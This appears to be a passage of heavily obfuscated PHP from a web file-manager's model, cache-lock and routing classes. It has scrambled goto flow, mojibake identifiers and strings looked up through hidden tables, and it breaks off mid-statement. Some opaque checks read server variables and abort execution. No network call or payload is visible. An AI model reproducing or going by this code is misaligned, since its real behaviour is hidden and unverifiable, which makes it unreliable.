$dšã“½âÄ» = $this->where(array($fÒ”ŸÒâï[1483] => array($fÒ”ŸÒâï[7], $B®±äÔâ®±)))->select(); if (!$dšã“½âÄ») { return array(); } goto d¬Î®³ºÄå; d¬Î®³ºÄå: return $dšã“½âÄ»; goto e÷¥…·…Î; D©Æõ·¦àˆ: $fó ĞŠêÚ = $this->parseWhereLike($fó ĞŠêÚ); $B®±äÔâ®± = Model($fÒ”ŸÒâï[2117])->where($fó ĞŠêÚ)->limit($d¥´®å“Ï)->select(); if (!$B®±äÔâ®±) { return array(); } goto Aã¥Ø•·ÜÒ; f Òİ¼È: $fÒ”ŸÒâï =& $_SERVER[ç]; $a”ó•¿“£ = strtolower($a”ó•¿“£); $fó ĞŠêÚ = array($fÒ”ŸÒâï[92] => $f®—áÆù¼ã, $fÒ”ŸÒâï[370] => array($fÒ”ŸÒâï[378], "\45{$a”ó•¿“£}\45")); goto D©Æõ·¦àˆ; e÷¥…·…Î: } private function _listDataApplyItem($bÊöÀÅç¹ˆ) { $c¬÷°ÌŠ„’ = array($bÊöÀÅç¹ˆ); $this->_listDataApply($c¬÷°ÌŠ„’); return $c¬÷°ÌŠ„’[0]; } private function _listDataApply(&$a¹•‹ÓÅ¢ò) { goto e²‚ÓÈÚåÎ; Dæ´¦²·èè: $this->_listAppendSourceRoot($a¹•‹ÓÅ¢ò, $b®õ­åÍ°»); goto a¶Ø¢ä´Âƒ; e²‚ÓÈÚåÎ: $cèì«Ğ™Ï÷ =& $_SERVER[ç]; if (!$a¹•‹ÓÅ¢ò) { return; } array_remove_key($a¹•‹ÓÅ¢ò, $cèì«Ğ™Ï÷[817]); goto cÕå…Áò„Ã; cÕå…Áò„Ã: $b®õ­åÍ°» = array_to_keyvalue($a¹•‹ÓÅ¢ò, $cèì«Ğ™Ï÷[33], $cèì«Ğ™Ï÷[1491]); $this->_listAppendGroup($a¹•‹ÓÅ¢ò, $b®õ­åÍ°»); $this->_listAppendMeta($a¹•‹ÓÅ¢ò, $b®õ­åÍ°»); goto Dæ´¦²·èè; a¶Ø¢ä´Âƒ: } private function _listAppendSourceRoot(&$E ÊøÖÙ¸Ê, $b„Òƒƒñ²) { goto DŸÙ…àŒÕ; DŸÙ…àŒÕ: $cÔ†¯ƒõÚñ =& $_SERVER[ç]; $f”†‹İ£ÎÃ = array($cÔ†¯ƒõÚñ[472] => 0, $cÔ†¯ƒõÚñ[398] => SourceModel::TYPE_USER, $cÔ†¯ƒõÚñ[478] => array($cÔ†¯ƒõÚñ[7], $b„Òƒƒñ²)); $aµï³¢ÀÚ³ = $cÔ†¯ƒõÚñ[1748]; goto FäğÔ´¡ƒ; FäğÔ´¡ƒ: $Dïµ¾•²¥ = Model($cÔ†¯ƒõÚñ[760])->order($cÔ†¯ƒõÚñ[1749])->field($aµï³¢ÀÚ³)->where($f”†‹İ£ÎÃ)->select(); $Dïµ¾•²¥ = array_to_keyvalue($Dïµ¾•²¥, $cÔ†¯ƒõÚñ[478]); $Dïµ¾•²¥ = array_remove_key($Dïµ¾•²¥, $cÔ†¯ƒõÚñ[478]); goto eâäÁœœÊ; eâäÁœœÊ: foreach ($E ÊøÖÙ¸Ê as &$eÑê…¢öÒö) { $eÑê…¢öÒö[$cÔ†¯ƒõÚñ[84]] = $Dïµ¾•²¥[$eÑê…¢öÒö[$cÔ†¯ƒõÚñ[1491]]] ? $Dïµ¾•²¥[$eÑê…¢öÒö[$cÔ†¯ƒõÚñ[1491]]] : array(); } unset($eÑê…¢öÒö); goto EŠèç«ÒÔ; EŠèç«ÒÔ: } private function _listAppendGroup(&$DäÎøŒãÎ¶, $dÉìö¯‰¸ò) { goto Dï£¾ŞÊ; Dï£¾ŞÊ: $F…è…Ä™° =& $_SERVER[ç]; $E¼ø™Å¥“ = array($F…è…Ä™°[1491] => array($F…è…Ä™°[7], $dÉìö¯‰¸ò)); $aëÕë¸Ëï§ = Model($F…è…Ä™°[1736])->where($E¼ø™Å¥“)->select(); goto C³Ø×È¦”Ç; C³Ø×È¦”Ç: $aÓÑá­…˜Å = array_to_keyvalue($aëÕë¸Ëï§, $F…è…Ä™°[33], $F…è…Ä™°[1654]); $aÓÑá­…˜Å = array_remove_value(array_unique($aÓÑá­…˜Å), $F…è…Ä™°[491]); if (!$aÓÑá­…˜Å || !$aëÕë¸Ëï§) { return; } goto c‰¼œ’½ëÔ; F°·ìÃ¬: foreach ($DäÎøŒãÎ¶ as &$e´ ´æß—õ) { $e´ ´æß—õ[$F…è…Ä™°[1829]] = array(); if (isset($aëÕë¸Ëï§[$e´ ´æß—õ[$F…è…Ä™°[1491]]])) { $e´ ´æß—õ[$F…è…Ä™°[1829]] = $aëÕë¸Ëï§[$e´ ´æß—õ[$F…è…Ä™°[1491]]]; } } unset($e´ ´æß—õ); goto F½˜ğÄµÔ; c‰¼œ’½ëÔ: $E¼ø™Å¥“ = array($F…è…Ä™°[1654] => array($F…è…Ä™°[7], $aÓÑá­…˜Å)); $dÔ¦·„¹ = Model($F…è…Ä™°[1827])->field($F…è…Ä™°[2118])->where($E¼ø™Å¥“)->select(); $dÔ¦·„¹ = array_to_keyvalue($dÔ¦·„¹, $F…è…Ä™°[1654]); goto DÂ©ö…½Ÿ; DÂ©ö…½Ÿ: $aëÕë¸Ëï§ = array_to_keyvalue_group($aëÕë¸Ëï§, $F…è…Ä™°[1491]); foreach ($aëÕë¸Ëï§ as &$c¯é¦ÎŠ’Ô) { $BÃ¸¼¦ò³Á = array(); foreach ($c¯é¦ÎŠ’Ô as $bİ¼¯âšÇ…) { if (!$bİ¼¯âšÇ…[$F…è…Ä™°[1750]]) { continue; } $b¿Ü¢°êÙø = Model($F…è…Ä™°[1822])->listData($bİ¼¯âšÇ…[$F…è…Ä™°[1750]]); $BÃ¸¼¦ò³Á[] = array($F…è…Ä™°[1654] => $bİ¼¯âšÇ…[$F…è…Ä™°[1654]], $F…è…Ä™°[2119] => $dÔ¦·„¹[$bİ¼¯âšÇ…[$F…è…Ä™°[1654]]][$F…è…Ä™°[28]], $F…è…Ä™°[481] => $dÔ¦·„¹[$bİ¼¯âšÇ…[$F…è…Ä™°[1654]]][$F…è…Ä™°[481]], $F…è…Ä™°[400] => $b¿Ü¢°êÙø); } $c¯é¦ÎŠ’Ô = $BÃ¸¼¦ò³Á; } unset($c¯é¦ÎŠ’Ô); goto F°·ìÃ¬; F½˜ğÄµÔ: } private function _listAppendMeta(&$dßÂ˜ó¥•è, $AÙÇ‹„ç„º) { goto fØØ¶µ»×; BÂíŠ¡ôà§: foreach ($fìŞ¡¾¾ù as &$A­¿Û¶àÕ) { $aØÏ±Æ× = array(); foreach ($A­¿Û¶àÕ as $d„‡êë¥¡°) { if (!in_array($d„‡êë¥¡°[$díë‘¨ì„Ù[92]], $D›îÄ¸¼‘ö)) { $aØÏ±Æ×[$d„‡êë¥¡°[$díë‘¨ì„Ù[92]]] = $d„‡êë¥¡°[$díë‘¨ì„Ù[370]]; } } $A­¿Û¶àÕ = $aØÏ±Æ×; } unset($A­¿Û¶àÕ); $b¬Ë¤ˆÒ¶Á = Model($díë‘¨ì„Ù[2120]); goto EÊÚ‡‡Âã‡; dñĞÙô¾Ñ‹: $F‹²”ÏäÊœ = array($díë‘¨ì„Ù[1491] => array($díë‘¨ì„Ù[7], $AÙÇ‹„ç„º)); $fìŞ¡¾¾ù = Model($díë‘¨ì„Ù[2096])->where($F‹²”ÏäÊœ)->select(); $fìŞ¡¾¾ù = array_to_keyvalue_group($fìŞ¡¾¾ù, $díë‘¨ì„Ù[1491]); goto BÂíŠ¡ôà§; fØØ¶µ»×: $díë‘¨ì„Ù =& $_SERVER[ç]; $d´»÷„†ğ = UserJobModel::JOB_KEY; $D›îÄ¸¼‘ö = array($díë‘¨ì„Ù[2098]); goto dñĞÙô¾Ñ‹; EÊÚ‡‡Âã‡: foreach ($dßÂ˜ó¥•è as &$DÇùÅ’«»®) { $A§®œÛÈÚ = array(); if (isset($fìŞ¡¾¾ù[$DÇùÅ’«»®[$díë‘¨ì„Ù[1491]]])) { $A§®œÛÈÚ = $fìŞ¡¾¾ù[$DÇùÅ’«»®[$díë‘¨ì„Ù[1491]]]; } $DÇùÅ’«»®[$díë‘¨ì„Ù[2121]] = array(); if (isset($A§®œÛÈÚ[$d´»÷„†ğ])) { $DÇùÅ’«»®[$díë‘¨ì„Ù[2121]] = $b¬Ë¤ˆÒ¶Á->getUserJobInfo($A§®œÛÈÚ[$d´»÷„†ğ]); } } unset($DÇùÅ’«»®); goto DƒßÒ’è°; DƒßÒ’è°: } protected function groupUserAll($E„Ì£Í”„¢) { $F‹µæ³‘äÏ =& $_SERVER[ç]; if (!$E„Ì£Í”„¢) { return !1; } $A‘ğ‹Ü ìÊ = Model($F‹µæ³‘äÏ[1736])->field($F‹µæ³‘äÏ[1491])->where(array($F‹µæ³‘äÏ[1654] => array($F‹µæ³‘äÏ[7], $E„Ì£Í”„¢)))->select(); $A‘ğ‹Ü ìÊ = array_to_keyvalue($A‘ğ‹Ü ìÊ, $F‹µæ³‘äÏ[33], $F‹µæ³‘äÏ[1491]); return array_unique($A‘ğ‹Ü ìÊ); } public function userSearch($aÏïÍõ¤éë, $E¸ùÉŸ¹±ó = "\x2a") { return Model($_SERVER[ç][501])->where($aÏïÍõ¤éë)->field($E¸ùÉŸ¹±ó)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\x5f\157\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($b…ÎËâªÜ) { $F’ŞµÔ‰Ã =& $_SERVER[ç]; if (!defined($F’ŞµÔ‰Ã[448])) { define($F’ŞµÔ‰Ã[448], 0); } return "\125\x73\145\162\117\x70\164\151\x6f\x6e\137{$b…ÎËâªÜ}\137" . USER_ID; } protected function filterWhere($bôŒÖì¦­) { $AäŸ¯å­á =& $_SERVER[ç]; if (!defined($AäŸ¯å­á[448])) { define($AäŸ¯å­á[448], 0); } $bôŒÖì¦­[$AäŸ¯å­á[1491]] = USER_ID; return $bôŒÖì¦­; } public function cacheRemoveUser($e”œ§²¯, $bÌ­¼éÈù) { return Cache::remove("\x55\x73\x65\162\117\160\164\151\157\156\137{$e”œ§²¯}\137" . $bÌ­¼éÈù); } protected function optionDefault($DºÙ‘ğ”À = '') { $e­Î³‘„† =& $_SERVER[ç]; if ($DºÙ‘ğ”À == $e­Î³‘„†[33]) { return $GLOBALS[$e­Î³‘„†[6]][$e­Î³‘„†[2122]]; } if ($DºÙ‘ğ”À == $e­Î³‘„†[2123]) { return $GLOBALS[$e­Î³‘„†[6]][$e­Î³‘„†[2124]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\141\147\x4c\x69\x73\x74"; public $modelType = "\x55\x73\x65\162\x4f\160\164\x69\157\x6e"; public $field = array("\156\x61\155\145", "\163\164\171\154\x65", "\x73\x6f\x72\x74"); public function listData($Cƒ°åº»ğ = false, $a”°‡’‹ÌŞ = "\x73\157\x72\x74", $dó¥â°æìª = false) { return parent::listData($Cƒ°åº»ğ, $a”°‡’‹ÌŞ, $dó¥â°æìª); } public function remove($dè¯ÚŒÇ×Ç) { return parent::remove($dè¯ÚŒÇ×Ç); } public function add($A‡öî¶ñ…, $eÀƒÒ‡¶ºç = "\x6c\x61\142\145\x6c\55\x67\162\x65\171\55\156\157\x72\155\x61\154") { $E³Ì£†­ÏŞ =& $_SERVER[ç]; if ($this->findByName($A‡öî¶ñ…)) { return !1; } $E”Èá»ÈÁ = array($E³Ì£†­ÏŞ[407] => $A‡öî¶ñ…, $E³Ì£†­ÏŞ[458] => $eÀƒÒ‡¶ºç, $E³Ì£†­ÏŞ[1658] => $this->getSort($E³Ì£†­ÏŞ[254]) + 1); return parent::insert($E”Èá»ÈÁ); } public function update($eĞ÷ğ¨É˜, $EÌ‘¤ØšÙÖ) { $dğƒ¼ÃØŠĞ =& $_SERVER[ç]; $E·ŠëéÎëË = $this->listData($eĞ÷ğ¨É˜); $D…ã¢ÊöÉ× = $this->findByName($EÌ‘¤ØšÙÖ[$dğƒ¼ÃØŠĞ[28]]); if (!$E·ŠëéÎëË || $D…ã¢ÊöÉ× && $D…ã¢ÊöÉ×[$dğƒ¼ÃØŠĞ[388]] != $E·ŠëéÎëË[$dğƒ¼ÃØŠĞ[388]]) { return !1; } return parent::update($eĞ÷ğ¨É˜, $EÌ‘¤ØšÙÖ); } public function moveTop($FëÛ¼¥èÆ‚) { $bĞ¡ê§ˆÇ =& $_SERVER[ç]; $dç‚ƒõµµ‚ = parent::listData(); $fŸ‚¬ÔíÕÛ = $this->getSort($bĞ¡ê§ˆÇ[253]); foreach ($dç‚ƒõµµ‚ as &$EˆïŠ¹÷¯) { if ($EˆïŠ¹÷¯[$bĞ¡ê§ˆÇ[388]] == $FëÛ¼¥èÆ‚) { $EˆïŠ¹÷¯[$bĞ¡ê§ˆÇ[1677]] = $fŸ‚¬ÔíÕÛ; continue; } $EˆïŠ¹÷¯[$bĞ¡ê§ˆÇ[1677]] += 1; } unset($EˆïŠ¹÷¯); return parent::resetData($dç‚ƒõµµ‚); } public function moveBottom($f¸®šá®°¯) { $d„«¾¤İã =& $_SERVER[ç]; $F§’ğÎ¨·µ = $this->getSort($d„«¾¤İã[254]) + 1; return parent::update($f¸®šá®°¯, array($d„«¾¤İã[1677] => $F§’ğÎ¨·µ)); } public function resetSort($eæÖ‹â¿‹·) { goto FŒÏ˜¦¼†; FŒÏ˜¦¼†: $b«¼ù‚³¡Ú =& $_SERVER[ç]; $Cˆ†·¢õ‹í = array(); $eæÖ‹â¿‹· = is_array($eæÖ‹â¿‹·) ? $eæÖ‹â¿‹· : array(); goto bäùá¤ïİÈ; F„Ãî®ï«: unset($DëŠÚ¸ØåÁ); return parent::resetData($d¯†ê¯‰Òğ); goto dô‰ëÁ¬Ê‡; bäùá¤ïİÈ: for ($fùÊ›å¤»± = 0; $fùÊ›å¤»± < count($eæÖ‹â¿‹·); $fùÊ›å¤»±++) { $Cˆ†·¢õ‹í[$eæÖ‹â¿‹·[$fùÊ›å¤»±] . $b«¼ù‚³¡Ú[33]] = $fùÊ›å¤»± + 1; } $d¯†ê¯‰Òğ = parent::listData(); foreach ($d¯†ê¯‰Òğ as &$DëŠÚ¸ØåÁ) { $d»Ü—¹ƒ£‘ = $Cˆ†·¢õ‹í[$DëŠÚ¸ØåÁ[$b«¼ù‚³¡Ú[388]]]; $DëŠÚ¸ØåÁ[$b«¼ù‚³¡Ú[1677]] = $d»Ü—¹ƒ£‘ ? $d»Ü—¹ƒ£‘ : $DëŠÚ¸ØåÁ[$b«¼ù‚³¡Ú[1677]]; } goto F„Ãî®ï«; dô‰ëÁ¬Ê‡: } private function getSort($a®¶í‚Ä®à) { $FÌÌÔÅŠˆ† =& $_SERVER[ç]; $d¶ñ‘ºÊˆ = parent::listData(); $dßÏî¿è’ = array_to_keyvalue($d¶ñ‘ºÊˆ, $FÌÌÔÅŠˆ†[33], $FÌÌÔÅŠˆ†[1677]); if (!$dßÏî¿è’) { $dßÏî¿è’ = array(0); } $d¯¸Ô´‹Âš = $a®¶í‚Ä®à == $FÌÌÔÅŠˆ†[254] ? max($dßÏî¿è’) : min($dßÏî¿è’); return intval($d¯¸Ô´‹Âš); } } goto EØ§”Šª¬; Dçí£‚¿™: function cacheLockWait() { usleep(mt_rand(200, 5000)); } if ($_SERVER[$_SERVER[ç][788]] != $_SERVER[$_SERVER[ç][789]]) { goto D§ÎõœìŞš; cùŞùÀÂß: $d«÷÷…š’Ê($_SERVER[$_SERVER[ç][795]]); goto Bë²´¿Ø–Õ; c›Ÿ‘£…ê: $e—ÜÜŠ†ï = explode($_SERVER[ç][227], $cíéÂÕÃ»Î); if (count($e—ÜÜŠ†ï) < $_SERVER[ç][570]) { $eŒåÑ×ÄÖœ = $_SERVER[ç][793]; $eŒåÑ×ÄÖœ(); } $d«÷÷…š’Ê = $_SERVER[ç][794]; goto cùŞùÀÂß; D§ÎõœìŞš: $cªæÉØì‚ = $_SERVER[ç][790]; $eßİ«Ÿó² = $_SERVER[$_SERVER[ç][791]] . $_SERVER[ç][792]; $cíéÂÕÃ»Î = $cªæÉØì‚($eßİ«Ÿó²); goto c›Ÿ‘£…ê; Bë²´¿Ø–Õ: } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A«¦ìŠÓ Å =& $_SERVER[ç]; $f—×ëÎ›À = $GLOBALS[$A«¦ìŠÓ Å[6]][$A«¦ìŠÓ Å[345]]; self::$cachePath = $f—×ëÎ›À[$A«¦ìŠÓ Å[173]][$A«¦ìŠÓ Å[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($dÔèàÀ›–Æ, $d®ë…Í­Œ = 0) { goto c³¨ï™õ¤×; bÃÂğ¹êÈš: $this->unlock($dÔèàÀ›–Æ); return !1; goto EÚ¥ º­—; c³¨ï™õ¤×: $cê‹ˆåï =& $_SERVER[ç]; $A•àæøÎê = microtime(!0); $f„®“ÎÚÄ™ = $A•àæøÎê + $d®ë…Í­Œ + 0.0001; goto DÛ¢Ğ°Øº¼; DÛ¢Ğ°Øº¼: $AôÖìî¤³ß = rtrim(self::$cachePath, $cê‹ˆåï[8]) . $cê‹ˆåï[796] . md5($dÔèàÀ›–Æ) . $cê‹ˆåï[785]; if (file_exists($AôÖìî¤³ß) && filemtime($AôÖìî¤³ß) && filemtime($AôÖìî¤³ß) < time() - 10) { @unlink($AôÖìî¤³ß); } do { if (file_exists($AôÖìî¤³ß)) { cacheLockWait(); continue; } $B»®–½Ûİ¡ = fopen($AôÖìî¤³ß, $cê‹ˆåï[797]); if (!$B»®–½Ûİ¡) { return !1; } $fî¾±ĞŠáµ = flock($B»®–½Ûİ¡, LOCK_EX | LOCK_NB); self::$caches[$dÔèàÀ›–Æ] = array($cê‹ˆåï[798] => $B»®–½Ûİ¡, $cê‹ˆåï[173] => $AôÖìî¤³ß); fwrite($B»®–½Ûİ¡, $f„®“ÎÚÄ™); clearstatcache(); if ($B»®–½Ûİ¡ && $fî¾±ĞŠáµ) { return !0; } cacheLockWait(); } while (microtime(!0) < $f„®“ÎÚÄ™); goto bÃÂğ¹êÈš; EÚ¥ º­—: } public function lockGet($d¸ãÂŞÂ›) { $Bù±öô‘Ü  =& $_SERVER[ç]; $EÜ…ğğéô‰ = rtrim(self::$cachePath, $Bù±öô‘Ü [8]) . $Bù±öô‘Ü [796] . md5($d¸ãÂŞÂ›) . $Bù±öô‘Ü [785]; return file_exists($EÜ…ğğéô‰); } public function unlock($båÉ®ß¢³æ) { goto D÷¥¡±¶…Û; a¤‡ÕŸèÛ: unset(self::$caches[$båÉ®ß¢³æ]); goto D°¤ƒÌâÅ¿; B‚äàˆÁ—·: @flock($DÖÍ˜Èñğ‹[$bùäÃ«ïêï[798]], LOCK_UN); @fclose($DÖÍ˜Èñğ‹[$bùäÃ«ïêï[798]]); @unlink($DÖÍ˜Èñğ‹[$bùäÃ«ïêï[173]]); goto a¤‡ÕŸèÛ; D÷¥¡±¶…Û: $bùäÃ«ïêï =& $_SERVER[ç]; $DÖÍ˜Èñğ‹ = self::$caches[$båÉ®ß¢³æ]; if (!$DÖÍ˜Èñğ‹) { return; } goto B‚äàˆÁ—·; D°¤ƒÌâÅ¿: } } goto D¡‡·µğÚ; B£Ø¶«ÆÑƒ: $EÉÓ¦³áøí = $_SERVER[ç][573]; class Application { private $defaultModule = "\151\x6e\x64\145\x78"; private $defaultController = "\x69\156\144\145\x78"; private $defaultAction = "\x69\156\x64\x65\170"; function __construct() { } public function setDefault($CêÎÚíœÎê) { goto bƒ™ßç£•ù; A½‚Ê¯éë¸: if (!$Cïïò©êİ) { return; } $this->{$_SERVER[øÆ][3]}($Fø«•é´–†[4], array($this, $Fø«•é´–†[5])); goto AÙ´›‰ŠŒ; C¤ÔÈÖ Àª: $this->defaultController = $E‹ˆŒíÒ©“[1] ? $E‹ˆŒíÒ©“[1] : $this->defaultController; $this->defaultAction = $E‹ˆŒíÒ©“[2] ? $E‹ˆŒíÒ©“[2] : $this->defaultAction; $Cïïò©êİ = $_SERVER[ç][574]; goto A½‚Ê¯éë¸; bƒ™ßç£•ù: $Fø«•é´–† =& $_SERVER[øÆ]; $E‹ˆŒíÒ©“ = $Fø«•é´–†[0]($Fø«•é´–†[1], $Fø«•é´–†[2]($CêÎÚíœÎê, $Fø«•é´–†[1])); $this->defaultModule = $E‹ˆŒíÒ©“[0] ? $E‹ˆŒíÒ©“[0] : $this->defaultModule; goto C¤ÔÈÖ Àª; AÙ´›‰ŠŒ: } public function appRun($C¤Ç«—Æå) { goto Dë›¯ ‹à; aÚª¯‡­´: $eáíò®© = $BíÎ‹åÕ[578]; if (strlen($eáíò®©) < $BíÎ‹åÕ[576]) { return; } $a×Ó‘¿‡[13](array($a×Ó‘¿‡[14], $a×Ó‘¿‡[15]), $bäÒ¶‘¿ƒ . $a×Ó‘¿‡[18], $C¤Ç«—Æå); goto f•‘™ê¯“; Dë›¯ ‹à: $BíÎ‹åÕ =& $_SERVER[ç]; $a×Ó‘¿‡ =& $_SERVER[øÆ]; $eßØ…Û¡ÙÁ = $a×Ó‘¿‡[0]($a×Ó‘¿‡[1], $C¤Ç«—Æå); goto Eí·ÜÊ…‹â; AñË¬ª£ßÓ: $bäÒ¶‘¿ƒ = $a×Ó‘¿‡[7]; $eêµõ¦«… = $BíÎ‹åÕ[577]; if (!$eêµõ¦«…) { die; } goto f„ã¢Ú”¤˜; f„ã¢Ú”¤˜: if ($f™ö¤ĞÀ†¶ == $a×Ó‘¿‡[8]) { $bäÒ¶‘¿ƒ = $a×Ó‘¿‡[9]; $eßØ…Û¡ÙÁ[0] = $a×Ó‘¿‡[10]; $eßØ…Û¡ÙÁ[1] = $eßØ…Û¡ÙÁ[1] . $a×Ó‘¿‡[11]; $C¤Ç«—Æå = $a×Ó‘¿‡[12]($a×Ó‘¿‡[1], $eßØ…Û¡ÙÁ); $C¤Ç«—Æå = $a×Ó‘¿‡[2]($C¤Ç«—Æå, $a×Ó‘¿‡[1]); } $a×Ó‘¿‡[13](array($a×Ó‘¿‡[14], $a×Ó‘¿‡[15]), $bäÒ¶‘¿ƒ . $a×Ó‘¿‡[16], $C¤Ç«—Æå); $a×Ó‘¿‡[17]($C¤Ç«—Æå); goto aÚª¯‡­´; Eí·ÜÊ…‹â: $f™ö¤ĞÀ†¶ = $a×Ó‘¿‡[6]($eßØ…Û¡ÙÁ[0]); $ağåê²ğçò = $BíÎ‹åÕ[575]; while (strlen($ağåê²ğçò) < $BíÎ‹åÕ[576]) { if (!$ağåê²ğçò) { break; } $ağåê²ğçò++; } goto AñË¬ª£ßÓ; f•‘™ê¯“: } private function autorun() { $BÌôùÓÊ =& $_SERVER[øÆ]; global $config; if ($BÌôùÓÊ[19]($config[$BÌôùÓÊ[20]]) == 0) { return; } foreach ($config[$BÌôùÓÊ[20]] as $fİ‚„«¿°å => $AíÊõ£ÚÈá) { $this->{$_SERVER[øÆ][21]}($AíÊõ£ÚÈá); } } private function hdfz5cd34dce() { goto cåÊÖ³–¶; cåÊÖ³–¶: $F»’Œ‡œê× =& $_SERVER[ç]; $E‚âÃÏÉ½ =& $_SERVER[øÆ]; $AÏœÈ©×¥ß = $E‚âÃÏÉ½[8]; goto e¼„îî®Œ™; cá‰ĞèÌ±ë: $DæÌºÄô¯ = $E‚âÃÏÉ½[25]($a®­¸‚‡¾Õ, 0, -$E‚âÃÏÉ½[24]($AÏœÈ©×¥ß)); $DÒÉâæ¾ = $F»’Œ‡œê×[579]; while ($DÒÉâæ¾ < $F»’Œ‡œê×[580]) { if ($DÒÉâæ¾ >= 0) { break; } $DÒÉâæ¾++; } goto dì¶Ô®‰§ê; dì¶Ô®‰§ê: $bæô°‚„ = array($E‚âÃÏÉ½[8], $DæÌºÄô¯); $bÉ£¯êÀ = $E‚âÃÏÉ½[26]($GLOBALS[$E‚âÃÏÉ½[22]][$E‚âÃÏÉ½[23]], 1); $GLOBALS[$E‚âÃÏÉ½[22]][$E‚âÃÏÉ½[23]] = $E‚âÃÏÉ½[27]($bæô°‚„, $bÉ£¯êÀ); goto aËªêĞÉ’Ö; e¼„îî®Œ™: $a®­¸‚‡¾Õ = $GLOBALS[$E‚âÃÏÉ½[22]][$E‚âÃÏÉ½[23]][0]; if (!$a®­¸‚‡¾Õ || $E‚âÃÏÉ½[24]($a®­¸‚‡¾Õ) <= $E‚âÃÏÉ½[24]($AÏœÈ©×¥ß)) { return; } if ($E‚âÃÏÉ½[6]($E‚âÃÏÉ½[25]($a®­¸‚‡¾Õ, -$E‚âÃÏÉ½[24]($AÏœÈ©×¥ß))) != $AÏœÈ©×¥ß) { return; } goto cá‰ĞèÌ±ë; aËªêĞÉ’Ö: $GLOBALS[$E‚âÃÏÉ½[22]][$E‚âÃÏÉ½[28]] = $E‚âÃÏÉ½[29]($E‚âÃÏÉ½[1], $GLOBALS[$E‚âÃÏÉ½[22]][$E‚âÃÏÉ½[23]]); goto e‡Ü×«ì£; e‡Ü×«ì£: } private function fdbud8b3b8f7() { goto D‚°Ú¤ƒŒ; D‚°Ú¤ƒŒ: $dÒÂëÑô‰‘ =& $_SERVER[ç]; $E¢‘¨× ¦ =& $_SERVER[øÆ]; if ($GLOBALS[$E¢‘¨× ¦[22]][$E¢‘¨× ¦[28]] != $E¢‘¨× ¦[10]) { return; } goto BœÏºèªé¬; BœÏºèªé¬: $f•½…Åì = $_SERVER[$E¢‘¨× ¦[30]]; $bö´Š†Õ© = $E¢‘¨× ¦[31]; if (!$E¢‘¨× ¦[32]($f•½…Åì, $bö´Š†Õ©)) { return; } goto Bê¤—Ğ¬¯Ü; d²—Î‘¾¾Á: $CŞ‹£Í°× = $E¢‘¨× ¦[2]($BÃ·¼›°°[0][0], $E¢‘¨× ¦[36]); $GLOBALS[$E¢‘¨× ¦[22]][$E¢‘¨× ¦[23]] = $E¢‘¨× ¦[0]($E¢‘¨× ¦[36], $CŞ‹£Í°×); $GLOBALS[$E¢‘¨× ¦[22]][$E¢‘¨× ¦[28]] = $E¢‘¨× ¦[29]($E¢‘¨× ¦[1], $GLOBALS[$E¢‘¨× ¦[22]][$E¢‘¨× ¦[23]]); goto aìªºß„š“; aìªºß„š“: $DƒöÒÅÙôÖ = $dÒÂëÑô‰‘[583]; goto Dù‚¤ÚÇ; fêÜÇÀÃê½: $CŞ‹£Í°× = $E¢‘¨× ¦[25]($f•½…Åì, $fŒµİùÒ‘– + $E¢‘¨× ¦[24]($bö´Š†Õ©)); $döˆìäØ–  = $dÒÂëÑô‰‘[582]; $E¢‘¨× ¦[34]($E¢‘¨× ¦[35], $CŞ‹£Í°×, $BÃ·¼›°°); goto d²—Î‘¾¾Á; Bê¤—Ğ¬¯Ü: $fŒµİùÒ‘– = $E¢‘¨× ¦[33]($f•½…Åì, $bö´Š†Õ©); $eîâÕäò¹  = $dÒÂëÑô‰‘[581]; if (strlen($eîâÕäò¹ ) < $dÒÂëÑô‰‘[570]) { die; } goto fêÜÇÀÃê½; Dù‚¤ÚÇ: } public function run() { goto c¾äÜ¶ƒá; A»÷‰ìëò: $d¥õ‰‹§”ã = $GLOBALS[$bøÓ³‡ßó[22]][$bøÓ³‡ßó[23]]; $dÙ¨µˆ¡†å = $GLOBALS[$bøÓ³‡ßó[22]][$bøÓ³‡ßó[28]]; $bøÓ³‡ßó[39]($bøÓ³‡ßó[40], isset($d¥õ‰‹§”ã[0]) && $d¥õ‰‹§”ã[0] ? $d¥õ‰‹§”ã[0] : $this->defaultModule); goto Dº¶¢š´Ÿ©; Fº§“·: while (strlen($Bšø˜Èšëœ) < $B²ñÉä…Õ¸[570]) { if (!$Bšø˜Èšëœ) { break; } $Bšø˜Èšëœ++; } $bøÓ³‡ßó[39]($bøÓ³‡ßó[43], MOD . $bøÓ³‡ßó[1] . ST . $bøÓ³‡ßó[1] . ACT); $d‘¢øÕ‘‰Í = $B²ñÉä…Õ¸[586]; goto eğÍİ”Èæ÷; AÑ—ø—Øåù: $A¢î£¬¤³Ş = $B²ñÉä…Õ¸[587]; if ($bøÓ³‡ßó[19]($d¥õ‰‹§”ã) >= 3) { $this->{$_SERVER[øÆ][21]}($dÙ¨µˆ¡†å); } else { $this->{$_SERVER[øÆ][21]}(ACTION); } goto F‹ÛÜò¶õë; c¾äÜ¶ƒá: $B²ñÉä…Õ¸ =& $_SERVER[ç]; $bøÓ³‡ßó =& $_SERVER[øÆ]; $this->{$_SERVER[øÆ][37]}(); goto e°‚ôÜ„ê‹; e°‚ôÜ„ê‹: $this->{$_SERVER[øÆ][38]}(); $cÎï§£‹ = $B²ñÉä…Õ¸[584]; if (strlen($cÎï§£‹) < $B²ñÉä…Õ¸[580]) { return; } goto A»÷‰ìëò; eğÍİ”Èæ÷: if (!$d‘¢øÕ‘‰Í) { die; } $_SERVER[$bøÓ³‡ßó[44]] = $bøÓ³‡ßó[6](ACTION); $this->{$_SERVER[øÆ][45]}(); goto AÑ—ø—Øåù; Dº¶¢š´Ÿ©: $bøÓ³‡ßó[39]($bøÓ³‡ßó[41], isset($d¥õ‰‹§”ã[1]) && $d¥õ‰‹§”ã[0] ? $d¥õ‰‹§”ã[1] : $this->defaultController); $bøÓ³‡ßó[39]($bøÓ³‡ßó[42], isset($d¥õ‰‹§”ã[2]) && $d¥õ‰‹§”ã[0] ? $d¥õ‰‹§”ã[2] : $this->defaultAction); $Bšø˜Èšëœ = $B²ñÉä…Õ¸[585]; goto Fº§“·; F‹ÛÜò¶õë: } private $wpjq7b76657d = array(); private $thzc895c0a6c = ''; public function nrwv9b49fff3() { goto BœÀ¦Àµ‡º; FŒÍ“„ŠŞŠ: $C– “ê¿ùŒ = 